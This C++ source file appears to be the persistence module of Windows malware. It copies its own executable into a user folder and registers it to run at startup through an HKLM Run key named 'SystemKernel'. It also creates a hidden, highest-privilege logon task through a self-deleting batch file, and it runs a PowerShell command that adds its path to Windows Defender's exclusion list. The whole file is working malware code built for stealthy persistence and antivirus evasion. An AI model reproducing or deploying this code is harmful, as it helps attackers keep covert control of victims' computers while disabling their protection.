#include "persistence.h"

namespace fs = std::filesystem;

std::string getPath(const char* folder) {
    char buf[MAX_PATH];
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    std::string currentP = buf;
    std::string name = fs::path(currentP).filename().string(); // Get the name of the file with the extension
    std::string appdata = Utilities::getFolder(folder);
    appdata.append("\\" + name);
    return appdata;
}

int excludeAV(const char* folder) {
    std::string path = getPath(folder);
    std::string command = "powershell -Command Add-MpPreference -ExclusionPath " + path;
    if (!system(command.c_str())) {
        return 0;
    }
    return 1;
}

std::string persistence::Autorun(const char* folder) {
    char buf[MAX_PATH];
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    std::string currentP = buf;
    std::string save_folder = getPath(folder);
    if (save_folder.length() <= 0) {
        return "Persistence failed!";
    }
    if (!Utilities::copyfile(currentP.c_str(), save_folder.c_str())) {
        return "Persistence failed!";
    }
    printf("%s", save_folder.c_str());
    HKEY key = NULL;
    LONG ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key);
    if (ret == ERROR_SUCCESS) {
        RegSetValueEx(key, (LPCSTR)"SystemKernel", 0, REG_SZ, (const BYTE*)save_folder.c_str(), save_folder.length());
        RegCloseKey(key);
    }
    if (excludeAV(folder)) {
        return "Exclusion Failed";
    }
    return "AutoRun";
}

std::string persistence::scheduleTsk(const char* folder) {
    char buf[MAX_PATH];
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    std::string currentP = buf;
    std::string save_folder = getPath(folder);
    if (save_folder.length() <= 0) {
        return "Persistence failed!";
    }
    if (!Utilities::copyfile(currentP.c_str(), save_folder.c_str())) {
        return "Persistence failed!";
    }
    /*std::string command = "schtasks /create /tn \"SystemKernelStartup\" /tr \"" + save_folder + "\" /sc onlogon /rl highest /f";
    if (!system(command.c_str())) {
        return "Failed to schedule";
    }*/
    std::ofstream schd(BAT_SCHD);
    schd << "@echo off \n";
    schd << "SCHTASKS /CREATE /TN \"SystemKernelStartup\" /TR \"" + save_folder + "\" /SC onlogon /RT highest /F";
    schd << "DEL" BAT_SCHD;
    schd.close();

    if ((INT_PTR)ShellExecuteA(0, "open", BAT_SCHD, 0, 0, SW_HIDE) <= 32) {
        return "Scheduled failed";
    }

    if (excludeAV(folder)) {
        return "Exclusion Failed";
    }
    return "Scheduled";
}

void persistence::markInstalled() {
    HKEY key;
    LPCSTR subkey = "Software\\SystemKernel";
    LPCSTR valueName = "Installed";
    DWORD data = 1;

    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, subkey, 0, NULL, 0, KEY_WRITE, NULL, &key, NULL) == ERROR_SUCCESS) {
        RegSetValueEx(key, valueName, 0, REG_DWORD, (const BYTE*)&data, sizeof(data));
        RegCloseKey(key);
    }
}

bool persistence::isFirstExecution() {
    HKEY key;
    LPCSTR subkey = "Software\\SystemKernel";
    LPCSTR valueName = "Installed";

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &key) == ERROR_SUCCESS) {
        DWORD data;
        DWORD dataSize = sizeof(data);

        if (RegQueryValueEx(key, valueName, NULL, NULL, (LPBYTE)&data, &dataSize) == ERROR_SUCCESS) {
            RegCloseKey(key);
            return false;
        }
        RegCloseKey(key);
    }
    return true;
}